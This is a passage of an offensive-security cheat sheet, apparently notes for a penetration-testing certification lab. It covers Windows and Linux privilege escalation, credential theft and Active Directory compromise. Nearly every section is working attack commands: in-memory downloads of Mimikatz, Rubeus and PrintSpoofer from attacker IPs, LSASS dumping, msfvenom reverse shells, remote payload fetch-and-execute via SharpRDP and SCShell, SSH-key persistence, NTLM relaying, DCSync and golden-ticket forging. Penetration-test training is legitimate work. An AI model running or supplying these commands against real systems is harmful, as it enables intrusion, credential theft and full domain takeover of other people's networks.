
# execute in memory
[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://ip/PrintSpooferNet.exe'))
[PrintSpooferNet.Program]::Main(@("any_pipe_name", "powershell -enc <base64>"))

# if you get the following error hen you don't have SeImpersonatePrivilege
Unhandled Exception: System.DllNotFoundException: Dll was not found.
```

printspoofer via meterpreter
```
getsystem -t 5
```

## incognito (impersonate any user from system)

```
# after getting a system shell (eg. via printspoofer) we want to impersonate user 'admin'
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
CORP1\admin
...
meterpreter > impersonate_token corp1\\admin

# return back to system
rev2self
```
### troubleshooting
```
- if you can't run getuid ()"stdapi_sys_config_getuid: Operation failed: Access is denied.") or shell:
meterpreter > rev2self
meterpreter > ps
...
3388   752   notepad.exe              x64   0        domain\user_you_want_to_impersonate  C:\Windows\System32\notepad.exe
...
meterpreter > migrate 3388

# if you run shell but only a process created e.g.
meterpreter > impersonate_token 'SomeDomain\SomeUser'
[+] Delegation token available
[+] Successfully impersonated user  XXXXX
meterpreter > shell
Process 2016 created.
Channel 4 created.
meterpreter >

"its a bug, you can get around in multiple ways, including spawning a process (execute -H -m -f cmd.exe) and then migrating to it, or just migrating to your selected user's process and then dropping to shell after a rev2self, or any one of a ton of ways like that"
```
# mimikatz
```
Use Invoke-Mimikatz to run
Newest (v2.2.0):
https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1
Older (v2.1.1): use this if the newest version doesn't work
https://raw.githubusercontent.com/BC-SECURITY/Empire/7efb7eeaabeb3daf916ead7856bb621bbca331f4/data/module_source/credentials/Invoke-Mimikatz.ps1

# must have admin privs
IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.45.164/Invoke-Mimikatz.ps1')

# equivalent to Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"
Invoke-Mimikatz -DumpCreds

# via cmd
powershell -ExecutionPolicy Bypass -Command "Import-Module .\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -Command 'privilege::debug token::elevate sekurlsa::logonpasswords'"
```

## Dump LSASS via GUI
Task Manager > Details Tab > Right-click lsass.exe > Create dump file

```
# powershell with admin priv
PS C:\Windows\system32> cd ~
PS C:\Users\admin.CORP1> cp C:\Users\ADMIN~1.COR\AppData\Local\Temp\lsass.DMP .
Invoke-Mimikatz -Command '"sekurlsa::minidump lsass.dmp" sekurlsa::logonpasswords'
```

## Dump LSASS via CLI

```
# cmd with admin priv
C:\Windows\system32>cd \windows\tasks
C:\Windows\Tasks>net use \\192.168.45.189\vscode /user:kali kali
C:\Windows\Tasks>\\192.168.45.189\vscode\OSEP-Code-Snippets\MiniDump\bin\x64\Release\MiniDump.exe
C:\Windows\Tasks>powershell
PS C:\Windows\Tasks> IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.45.164/Invoke-Mimikatz.ps1')
PS C:\Windows\Tasks> Invoke-Mimikatz -Command '"sekurlsa::minidump lsass.dmp" sekurlsa::logonpasswords'
```

## bypass lsa protection to dump LSASS
```
Invoke-Mimikatz -Command 'privilege::debug !+ "!processprotect /process:lsass.exe /remove" sekurlsa::logonpasswords'
# alternatively load mimidrv.sys via service (must be admin)
sc create mimidrv binPath= C:\windows\tasks\mimidrv.sys type= kernel start= demand
sc start mimidrv
IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.195/Invoke-Mimikatz2.ps1")
Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`""
upload OSEP-Code-Snippets/MiniDump/bin/x64/Release/MiniDump.exe
download C:\\Windows\\tasks\\lsass.dmp
pypykatz lsass.dmp
# alternatively run on the machine
Invoke-Mimikatz -Command "`"sekurlsa::minidump c:\windows\tasks\lsass.dmp`" sekurlsa::logonpasswords"
```

# windows lateral movement

## RDP troubleshooting
sometimes xfreerdp will not let you rdp even though you have the correct password, this is because it doesn't read in special characters properly
```
...nla_recv_pdu:freerdp_set_last_error_ex ERRCONNECT_LOGON_FAILURE...

# workaround 1: /sec:tls
xfreerdp /u:Administrator /p:'m31R}dd7rX]@7G' /v:192.168.153.122 /timeout:50000 +auto-reconnect /auto-reconnect-max-retries:0 /sec:tls

# workaround 2: -sec-nla
xfreerdp /u:Administrator /p:'m31R}dd7rX]@7G' /v:192.168.153.122 /timeout:50000 +auto-reconnect /auto-reconnect-max-retries:0 -sec-nla

# both workarounds require to retype the password in the GUI
# alternative 1: install reminna
# alternative 2: try rdesktop
```

```
# sometimes xfreerdp may fail because there are too many users connected via RDP
# in your reverse shell
qwinsta /server:<YourServerName>
rwinsta /server:<YourServerName> <SessionId>
```

## RDP with DisableRestrictedAdmin
```

Invoke-Mimikatz -Command "privilege::debug `"sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:\`"mstsc.exe /restrictedadmin\`"`""
# alternatively
$program = "\`"mstsc.exe /restrictedadmin\`""
Invoke-Mimikatz -Command "privilege::debug `"sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:$program`""
```

```
# if the remote server does not have DisableRestrictedAdmin (default settings) we add it (powershell remoteing must be enabled)
Invoke-Mimikatz -Command "privilege::debug `"sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell.exe`""

# new powershell will pop up
Enter-PSSession -Computer appsrv01

# enable restricted admin
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
Exit
# alternative: cmd
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# if the registry exists use Set-ItemProperty instead and set the -Value to 0
```

```
# rdp directly from kali
xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore
```

## bypass firewall blocking rdp
### meterpreter reverse rdp autoroute
```
# first obtain a meterpreter shell on the target
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set session 1
msf6 post(multi/manage/autoroute) > exploit
...
msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set srvhost 127.0.0.1
msf6 auxiliary(server/socks_proxy) > exploit -j
...
[*] Starting the SOCKS proxy server

# in a seperate terminal
sudo cp /etc/proxychains4.conf /etc/proxychains.conf
sudo vim /etc/proxychains.conf

# edit the very bottom line from
socks4  127.0.0.1 9050
# to
socks5 127.0.0.1 1080

# proxy in
proxychains rdesktop 192.168.164.10
```
### chisel reverse rdp autoroute
```
# on kali
./chisel server -p 8080 --socks5
sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' /etc/ssh/sshd_config
sudo systemctl start ssh.service
ssh -N -D 0.0.0.0:1080 localhost

# on windows
chisel.exe client 192.168.119.120:8080 socks

# back on kali
sudo proxychains rdesktop 192.168.120.10
```

## rdp as a console with sharpRDP
```
# latest maintained fork: https://github.com/SygniaLabs/SharpRDP

# on kali
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.189 LPORT=443 EXITFUNC=thread -f exe -o met.exe
python3 -m http.server 80
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.45.189; set lport 443; exploit"

# on pivot windows
C:\Windows\Tasks>copy \\192.168.45.189\vscode\OSEP-Code-Snippets\SharpRDP\SharpRDP\bin\Release\SharpRDP.exe .
C:\Windows\Tasks>sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=corp1\dave password=lab
```

## steal rdp creds with rdpthief

```
# compile \vscode\OSEP-Code-Snippets\rdpthief_mstsc_injector
C:\Windows\Tasks>copy \\192.168.45.189\vscode\OSEP-Code-Snippets\rdpthief_mstsc_injector\bin\x64\Release\rdpthief_mstsc_injector.exe .
C:\Windows\Tasks>copy \\192.168.45.189\vscode\OSEP-Code-Snippets\rdpthief_mstsc_injector\RdpThief.dll .
C:\Windows\Tasks>rdpthief_mstsc_injector.exe

# after rdp creds have been stolen
C:\Windows\Tasks>dir C:\<whoami>\admin\AppData\Local\Temp\
C:\Windows\Tasks>type C:\Users\admin.CORP1\AppData\Local\Temp\data.bin

# troubleshoot
- if you're running rdpthief_mstsc_injector.exe as admin then you have to run mstsc as admin as well otherwise RdpThief.dllwon't be injected
```

## fileless alternative to psexec
```
# Usage: PSLessExec.exe [Target] [Service] [BinaryToRun]
fileless_lateral_movement\bin\Release\PSLessExec.exe file01 SensorService C:\\inject.exe

# alternative
https://github.com/Mr-Un1k0d3r/SCShell

# SensorService is assumed to be on the target machine, note this service cannot connect out to your http server so use wuauserv (Windows Update Service)
python3 scshell.py DOMAIN/USER@target -hashes 00000000000000000000000000000000:ad9827fcd039eadde017568170abdecce -service-name SensorService
python3 scshell.py DOMAIN/USER@target -hashes 00000000000000000000000000000000:ad9827fcd039eadde017568170abdecce -service-name wuauserv

# once you get the SCShell C:\windows\system32\cmd.exe /c powershell download file, then cmd.exe /c execute the payload.exe
C:\windows\system32\cmd.exe /c "powershell Invoke-WebRequest -Uri http://192.168.45.189/met.exe -OutFile C:\Windows\Tasks/met.exe"
C:\Windows\Tasks/met.exe

```

# linux lateral movement

```
# search home directory for private key
find /home/ -name "id_rsa"
find /home/ -name "*.key"
find /home/ -name "*.pem"
find /home/ -name "*.pub"
ls -lah /home/*/.ssh

# grep /etc/passwd for user of that private key to confirm user belongs to a different machine

# find potential targets to move laterally to
cat known_hosts
cat .bash_history
host <computer_name>

# view known_hosts to determine which machine that key is for; doesn't work if host are hashed

# use john to crack ssh key if its encrypted
python /usr/share/john/ssh2john.py svuser.key > svuser.hash
sudo john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ./svuser.hash
```

## persistence
```
# persistence with ssh-keygen
ssh-keygen
cat /home/kali/.ssh/id_rsa.pub | xclip -selection clipboard
echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8= kali@kali" >> /home/linuxvictim/.ssh/authorized_keys
```

```
# persistence with controlmaster config
vim ~/.ssh/config
Host *
        ControlPath ~/.ssh/controlmaster/%r@%h:%p
        ControlMaster auto
        ControlPersist 10m

chmod 644 ~/.ssh/config
mkdir ~/.ssh/controlmaster

# wait for a victim to connect
ls -al ~/.ssh/controlmaster/
...
srw------- 1 offsec offsec    0 May 13 13:55 offsec@linuxvictim:22

# connect back to the linux victim
ssh offsec@linuxvictim
# alternatively if you are a different user then use the full path to the socket file with -S
ssh -S /home/offsec/.ssh/controlmaster/offsec@linuxvictim\:22 offsec@linuxvictim
```

```
# persistence with agent forwarding (ROOT NEEDED: lateral movement via intermediate ssh agent)

# copy our public key to both intermediate and destination server
ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@intermediate
ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@destination

vim ~/.ssh/config
...
ForwardAgent yes

sudo vim /etc/ssh/sshd_config
...
AllowAgentForwarding yes

# start ssh-agent in kali and add keys
eval `ssh-agent`
ssh-add

# ssh to the intermediate first then from the intermediate session ssh to the destination
ssh offsec@intermediate
ssh offsec@destination
```

# ansible

## enumeration
```
# check ansible exists
ls /etc/ansible
cat /etc/passwd | grep ansible
```

```
# switch to the ansible user
su ansibleadm

# list all machines ansible can access
ansible-inventory --list --yaml

# run ansible enumeration commands
ansible victims -a "whoami"
ansible victims -a "whoami" --become
```

## playbooks
```
# run playbook
ansible-playbook getinfo.yml

# ansible gather credentials from playbooks
less /opt/playbooks/writefile.yaml

# search users and password
/become_user
/ansible_become_pass

# some creds are encrypted via ansible vault
ansible_become_pass: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          ...

# copy value into test.yml, crack via ansible2john and hashcat
vim test.yml
$ANSIBLE_VAULT;1.1;AES256
393636316139...

ansible2john test.yml | cut -d ':' -f 2 > hash.txt
hashcat hash.txt --force --hash-type=16900 /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

# copy contents of test.yml onto the ansible machine as pw.txt
cat pw.txt | ansible-vault decrypt
Vault password:<PASSWORD_CRACKED_FROM_HASHCAT>
```

```
# ansible modules leaking sensitive data when loggin
# when ansible victim runs OSEP-Code-Snippets/ansible_playbook/backup_db.yml
cat /var/log/syslog
```

## offensive ansible
modify/write to existing ansible playbooks if permissions are set to run shell commands:
- persistence (see `OSEP-Code-Snippets/ansible_playbook/persistence.yml`)
- backup database (see `OSEP-Code-Snippets/ansible_playbook/backup_db.yml`)
- reverse shell (see `OSEP-Code-Snippets/ansible_playbook/revshell.yml`)
- meterpreter shell (see `OSEP-Code-Snippets/ansible_playbook/metshell.yml`)
```
# follow steps in 'linux shellcode loader with AV bypass'
cat simpleLoader.c | base64 -w0
- copy output into metshell.yml
```

# artifactory

## enumeration
```
ps aux | grep artifactory
firefox: http://<ip>:8081

# must have root
ls -lah /<ARTIFACTORY FOLDER>/var/backup/access
ls -lah /opt/jfrog/artifactory/var/backup/access
```

## exploit
```
# copy password hash from backup json into hash.txt
cat /opt/jfrog/artifactory/var/backup/access/access.backup.20200730120454.json
# remove 'bcrypt$' in 'bcrypt$$2a$...'
sudo john --format=bcrypt line3.txt --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

# copy database and access user credentials
mkdir /tmp/hackeddb
sudo cp -r /opt/jfrog/artifactory/var/data/access/derby /tmp/hackeddb
sudo chmod 755 /tmp/hackeddb/derby
sudo rm /tmp/hackeddb/derby/*.lck
sudo /opt/jfrog/artifactory/app/third-party/java/bin/java -jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij
ij> connect 'jdbc:derby:/tmp/hackeddb/derby';
ij> select * from access_users;
# copy password hash from output into hash.txt
# remove 'bcrypt$' in 'bcrypt$$2a$...'
sudo john --format=bcrypt line3.txt --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

# need write access to /opt/jfrog/artifactory/var/etc/access
vim /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
...
haxmin@*=haxhaxhax

sudo chmod 600 /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start
sudo grep "Create admin user" /opt/jfrog/artifactory/var/log/console.log

# deploy binary
curl -u<USERNAME>:<PASSWORD> -T <PATH_TO_FILE> "http://192.168.178.40:8081/artifactory/generic-local/<TARGET_FILE_PATH>"
# download binary
curl -u<USERNAME>:<PASSWORD> -O "http://192.168.178.40:8081/artifactory/generic-local/<TARGET_FILE_PATH>"
```

# linux kerberos
```
# use domain with the ssh login
ssh administrator@corp1.com@192.168.178.45

# get credential cache file location
env | grep KRB5CCNAME

# request a kerberos ticket
kinit
# renew ticket before it expires
kinit -R

# show tickets currently stored in users credential cache file
klist

# klist must have ticket for ldapsearch with kerberos authentication (-Y GSSAPI)
# search kerberos services with servicePrincipalName
ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName
...
servicePrincipalName: MSSQLSvc/DC01.corp1.com:1433
...

# request a service ticket with kvno and verify with klist
kvno MSSQLSvc/DC01.corp1.com:1433
klist
```

## stealing keytab
```
# see which cron scripts are executed with keytabs
cat /etc/crontab
# use kutil to export keytab file
ktutil
# add entry
addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac
# write keytab to (this is the stealing part)
wkt /tmp/administrator.keytab
quit

# run as a different user (orignal user is root)
kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
# use ticket on smb service
smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
```

## ccache files
```
# ccache files are usually stored in 
ls -al /tmp/krb5cc_*

sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow
sudo chown offsec:offsec /tmp/krb5cc_minenow

# clear credentials, verify and use new credentials
kdestroy; klist
export KRB5CCNAME=/tmp/krb5cc_minenow
klist
# request a service ticket with kvno and verify with klist
kvno MSSQLSvc/DC01.corp1.com:1433
klist
```

## impacket

```
# dependencies: krb5-user
# copy ccache back to kali
scp offsec@linuxvictim:/tmp/krb5cc_minenow /tmp/krb5cc_minenow
export KRB5CCNAME=/tmp/krb5cc_minenow

# get ip address of dc and add to /etc/hosts on kali
offsec@linuxvictim:~$ host corp1.com
corp1.com has address 192.168.120.5

vim /etc/hosts
...
192.168.120.5 CORP1.COM DC01.CORP1.COM
...


# comment out proxy_dns in /etc/proxychains.conf and make sure 'socks5 127.0.0.1 1080' is at the bottom of the file
ssh offsec@linuxvictim -D 1080

proxychains impacket-GetADUsers -all -k -no-pass -dc-ip CORP1.COM CORP1.COM/Administrator
proxychains impacket-GetUserSPNs -k -no-pass -dc-ip CORP1.COM CORP1.COM/Administrator
proxychains impacket-psexec Administrator@DC01.CORP1.COM -k -no-pass
```

# MSSQL

## enumeration
```
# use built in tool
setspn -T corp1 -Q MSSQLSvc/*

# use powershell script
. .\GetUserSPNs.ps1
```

## authentication
`OSEP-Code-Snippets/MSSQL`
```
# stealing hashes via MSSQL responder ntlmv2 cracking
C:\Users\admin.CORP1>copy \\192.168.45.206\vscode\OSEP-Code-Snippets\MSSQL\bin\Release\MSSQL.exe .

sudo systemctl stop smbd nmbd  
sudo responder -I tun0

C:\Users\admin.CORP1>MSSQL.exe
```
sometimes you will need to enumerate the server to obtain credentials
```
# example: challenge 2
type C:\inetpub\wwwroot\search.asp
...
ConnString="DRIVER={SQL Server};SERVER=localhost;UID=webapp11;PWD=89543dfGDFGH4d;DATABASE=music"
...

# replace the standard connection string
conStr = $"Server = {serv}; Database = {db}; Integrated Security = True;";
# with this one
conStr = "SERVER=localhost;UID=webapp11;PWD=89543dfGDFGH4d;DATABASE=music";
```
## stealing/relaying creds
```
# relay ntlmv2 hash with impacket
# requires smb signing disabled
# requires simple_shellcode_runner/simple_shellcode_runner.ps1 as run.txt
sudo systemctl stop smbd nmbd  
python3 -m http.server 80
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.45.197; set lport 443; exploit"
kali@kali:~$ pwsh
PS /home/kali> $text = "(New-Object System.Net.WebClient).DownloadString('http://<KALI_IP>/run.txt') | IEX"
PS /home/kali> [Convert]::ToBase64String( [System.Text.Encoding]::Unicode.GetBytes($text))
KABOAGUA...==
sudo impacket-ntlmrelayx --no-http-server -smb2support -t <PIVOT_TARGET_IP> -c 'powershell -enc KABOAGUA...=='

C:\Users\admin.CORP1>MSSQL.exe
```

## escalation
`OSEP-Code-Snippets/MSSQL`
```
# swap methods in 'OSEP-Code-Snippets/MSSQL/Program.cs' if one doesn't work  
# method 1: EXECUTE AS LOGIN sa
String res = executeQuery("EXECUTE AS LOGIN = 'sa';", con);  
# method 2: EXECUTE AS USER dbo
String res = executeQuery("use msdb; EXECUTE AS USER = 'dbo';", con);
```

## code execution
`OSEP-Code-Snippets/MSSQL`
```
## code execution
# swap methods in 'OSEP-Code-Snippets/MSSQL/Program.cs' if one doesn't work
# method 1:  xp_cmdshell
res = executeQuery("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", con); 
# method 2:  sp_OACreate
res = executeQuery("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;", con);
```

```
# executing shellcode runner
# generate b64 powershell payload
pwsh
PS> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("(New-Object System.Net.WebClient).DownloadString('http://192.168.45.246/run.txt') | IEX"))
KABOA...FAFgA
# putting it into OSEP-Code-Snippets/MSSQL
...
String cmd = "powershell -enc KABOA...FAFgA";
...
```

## custom assemblies (user defined functions udf)
`OSEP-Code-Snippets/mssql_custom_assemblies`
```
# by default 'msdb' database has TRUSTWORTHY but custom databases may use it as well
Compile mssql_ca.dll from OSEP-Code-Snippets/mssql_custom_assemblies
run pwsh OSEP-Code-Snippets/mssql_custom_assemblies/dll_to_hextring.ps1
copy and paste output into 'CREATE ASSEMBLY myAssembly FROM 0x4D5A90..." in OSEP-Code-Snippets/MSSQL
```

## linked sql servers (lateral movement)
`OSEP-Code-Snippets/MSSQL`
```
# enumerating linked sql servers

# lateral movement via mssql

# privilege escalation via linked SQL server

# code execution via linked SQL server (requires escalation)
```

## red team tools
```
# perform some of the above via powershell
https://github.com/NetSPI/PowerUpSQL
# evil sql client
https://github.com/NetSPI/ESC
```

## PowerUpSQL.ps1

```
# reference: https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet

. .\PowerUpSQL.ps1

# -Instance format
 "dc01.corp1.com"
 "192.168.178.5"
 "192.168.178.5,1433"
 "dc01.corp1.com,1433"

# enumeration
Get-SQLInstanceDomain -Verbose
Get-SQLServerInfo -Verbose -Instance "dc01.corp1.com,1433"

# authentication
Get-SQLQuery -Verbose -Instance "10.2.2.5,1433"
Get-SQLQuery -Verbose -Instance "10.2.2.5,1433" -username testuser -password testpass

# escalation
Invoke-SQLImpersonateService -Verbose -Instance "dc01.corp1.com,1433"
cp \\192.168.45.206\vscode\OSEP-Code-Snippets\MSSQL\Inveigh.ps1
. .\Inveigh.ps1
Invoke-SQLEscalatePriv -Verbose -Instance "dc01.corp1.com,1433"

# execution
$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.Status -like "Accessible"}
$Targets | Invoke-SQLOSCmd -Verbose -Command "whoami" -Threads 10


# lateral movement
Get-SqlServerLinkCrawl -Verbose -Instance "dc01.corp1.com,1433"
```

# Active Directory

## bloodhound
Collection
```
IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.197/SharpHound.ps1")
# make sure you are in a writable folder
Invoke-BloodHound -CollectionMethod All
```
Graphing
```
sudo neo4j console
# after changing default password
bloodhound
```
## permissions
```
# powerview
Latest maintained: https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/situational_awareness/network/powerview.ps1

# enumerate object permissions for GenericAll/WriteDACL
Get-ObjectAcl -Identity offsec -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
# tidier version
Get-ObjectAcl -Identity offsec -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Sort-Object Identity | Format-Table Identity, AceType, ActiveDirectoryRights -Wrap

# filter for current user  
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
# tidier version
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} | Format-Table Identity, ObjectDN, AceType, ActiveDirectoryRights -Wrap

# same as above but for groups
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

```
# GenericAll
# scenario: user prod\offsec has GenericAll on user prod\TestService1
# examples of GenericAll abuse, pretty much root privileges of AD
# change domain user password
net user testservice1 h4x /domain
# add to domain
net group testgroup offsec /add /domain
```

```
# WriteDACL
# scenario: user prod\offsec has WriteDACL on user prod\TestService2
# example of WriteDACL abuse to give GenericAll to user testservice2  
Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All

# verify updated permission
Get-ObjectAcl -Identity testservice2 -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

```
# GenericWrite
# scenario: user prod\offsec has GenericWrite on user prod\TestService3
# example of GenericWrite abuse to set SPN to user TestService3 then Kerberoast

# alternative 1: if you know the creds of the user that has GenericWrite
$SecPassword = ConvertTo-SecureString 'lab' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('PROD\offsec', $SecPassword)
Set-DomainObject -Credential $Cred -Identity TestService3 -SET @{serviceprincipalname='prod.corp1.com/TestService3.prod.corp1.com:1337'}
# alternative 2: you don't need creds
Set-DomainObject -Identity TestService3 -SET @{serviceprincipalname='prod.corp1.com/TestService3.prod.corp1.com:1337'}
# alternative 3: without using powerview
setspn -a prod.corp1.com/TestService3.prod.corp1.com:1337 prod.corp1.com\TestService3

# then perform kerberoast with Invoke-Kerberoast.ps1
```

## kerberos unconstrained delegation
### enumeration
we want to look for `TRUSTED_FOR_DELEGATION` any machine with this will be the target
```
Get-DomainComputer -Unconstrained
Get-DomainComputer -Unconstrained | Format-Table name, dnshostname, useraccountcontrol -Wrap
# you can use the dnshostname property to determine its IP
nslookup <dnshostname>

# enumeration troubleshooting
Exception calling "FindAll" with "0" argument(s): "Unknown error (0x80005000)"
- powerview won't work with local admin, local admin is not domain joined
- SYSTEM is domained joined (as a computer object), upgrade to SYSTEM user via printspoofer
```
### manual approach
attacker must wait for a victim to access a machine that has unconstrained delegation
this example: admin user is visiting `http://appsrv01` from a client machine which stores the TGT in memory
```
# on the appsrv01 machine as user offsec open powershell with admin priv and -ep bypass
# try different versions of Invoke-Mimikatz.ps1 if you still get errors
. .\Invoke-Mimikatz2.ps1
Invoke-Mimikatz -Command "privilege::debug sekurlsa::tickets"
# look for ideal Client Name to target that is also forwardable in the flags
...
Client Name  (01) : admin ; @ PROD.CORP1.COM
...
# note: sometimes you won't get the ticket
- you need to be quick or use the right browser to visit http://appsrv01 to cache TGT in memory
Invoke-Mimikatz -Command 'privilege::debug "sekurlsa::tickets /export"'
# ls to see all the tickets and find the one that matches your target
Invoke-Mimikatz  -Command '"kerberos::ptt [0;10a3f5]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi"'
C:\Tools\SysinternalsSuite\PsExec.exe /accepteula \\cdc01 cmd
```
### semi-auto approach
force dc to connect to application service using SpoolSample.exe
```
# check if print spooler service is running and accessible
dir \\cdc01\pipe\spoolss

# with admin priv load rubeus into memory
$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.246/rubeus.txt')
$RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
[Rubeus.Program]::Main("monitor /interval:5 /filteruser:DC03$ /nowrap".Split())

# in a seperate terminal
.\SpoolSample.exe  APPSRV01
Invoke-SpoolSample -Target '<hostname>' -CaptureServer '<hostname>'
Invoke-SpoolSample -Target 'CDC01.prod.corp1.com' -CaptureServer 'APPSRV01.prod.corp1.com'

# copy and paste the captured base64 encoded ticket
$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.246/rubeus.txt')
$RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
[Rubeus.Program]::Main("ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...".Split())

# once authenticated as CDC01$ perform dcsync and dump password hash of prod\krbtgt
IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.246/Invoke-Mimikatz2.ps1")
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt"'
Domain : prod.corp1.com / S-1-5-21-749318035-33825885-105668094
...
Credentials:
  Hash NTLM: cce9d6cd94eb31ccfbb7cc8eeadf7ce1
    ntlm- 0: cce9d6cd94eb31ccfbb7cc8eeadf7ce1
...

# with the krbtgt NTLM hash, we can craft a golden ticket and obtain access to any resource in the domain
# reference: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets
# we can confirm domain-sid with any domain computer (APPSRV01, 192.168.178.75)
impacket-lookupsid prod/offsec@192.168.178.75
...
[*] Domain SID is: S-1-5-21-749318035-33825885-105668094
...
# craft golden ticket
impacket-ticketer -nthash cce9d6cd94eb31ccfbb7cc8eeadf7ce1 -domain-sid S-1-5-21-749318035-33825885-105668094 -domain prod newAdmin
export KRB5CCNAME=$PWD/fakeuser.ccache
# alternative: inject golden ticket directly into memory
mimikatz # kerberos::golden /domain:prod.corp1.com /sid:S-1-5-21-749318035-33825885-105668094 /rc4:cce9d6cd94eb31ccfbb7cc8eeadf7ce1 /user:newAdmin /id:500 /ptt

sudo vim /etc/hosts
...
192.168.178.70 prod.corp1.com cdc01.prod.corp1.com
...
impacket-psexec  -k -no-pass PROD/newAdmin@cdc01.prod.corp1.com -dc-ip 192.168.178.70 -target-ip 192.168.178.70

# alternatively, with golden ticket we can dump the password hash of a member of the Domain Admins group (DCSync attack)
# which we will attempt below
```
### clean approach
perform semi-auto approach in the comfort of kali
prerequisites:
- admin credentials
- edit /etc/hosts
```
sudo vim /etc/hosts
...
# <dc_ip> <domain> <dc_fqdn>
192.168.178.70 prod.corp1.com cdc01.prod.corp1.com
...

